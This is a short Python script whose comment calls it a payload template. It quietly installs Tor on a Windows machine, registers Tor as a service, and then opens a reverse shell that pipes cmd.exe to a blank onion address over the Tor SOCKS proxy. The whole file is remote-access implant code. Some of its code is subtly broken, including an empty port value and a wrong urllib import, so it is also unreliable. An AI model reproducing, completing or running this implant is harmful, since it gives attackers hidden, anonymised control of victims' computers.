#this file never actually being used as a payload just a template
import socket
import os
import urllib
import subprocess
import socks
from time import sleep
import urllib

#constents
OnionUrl = ""
PORT = int("")

def DownloadTor():
    urllib.request.urlretrieve("https://www.torproject.org/dist/torbrowser/7.0.1/torbrowser-install-7.0.1_en-US.exe",'~/tordown.exe')
    os.system("tordown.exe /S")
    user = subprocess.check_output("echo %USERNAME%",shell=True)
    os.system("C:/Users/"+user+"/Desktop/Tor Browser/Browser/TorBrowser/Tor/tor.exe --service install")
    sleep(60*5)


def ConnectReverse():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    s = socks.socksocket()
    s.connect((OnionUrl, PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["cmd.exe"]);

DownloadTor()
ConnectReverse()